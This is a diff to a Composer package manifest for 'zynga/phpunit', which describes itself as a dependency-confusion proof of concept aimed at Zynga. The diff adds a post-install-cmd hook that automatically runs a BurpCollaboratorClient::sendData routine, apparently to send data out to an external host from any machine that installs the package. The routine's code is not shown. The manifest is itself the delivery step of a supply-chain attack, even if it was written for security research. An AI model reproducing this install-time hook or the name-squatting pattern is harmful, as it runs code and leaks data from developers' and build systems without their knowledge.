@@ -1,7 +1,19 @@
 {
     "name": "zynga/phpunit",
-    "description": "Dependency conf poc",
+    "description": "Dependency c0nfusion poc for zynga",
     "license": "MIT",
-    "minimum-stability": "stable",
-    "require": {}
+    "version": "1.1",
+    "require": {
+    "php": ">=7.4"
+	},
+  "autoload": {
+    "psr-4": {
+      "MyNamespace\\": "src/"
+    }
+  },
+  "scripts": {
+    "post-install-cmd": [
+      "MyNamespace\\BurpCollaboratorClient::sendData"
+    ]
+  }
 }
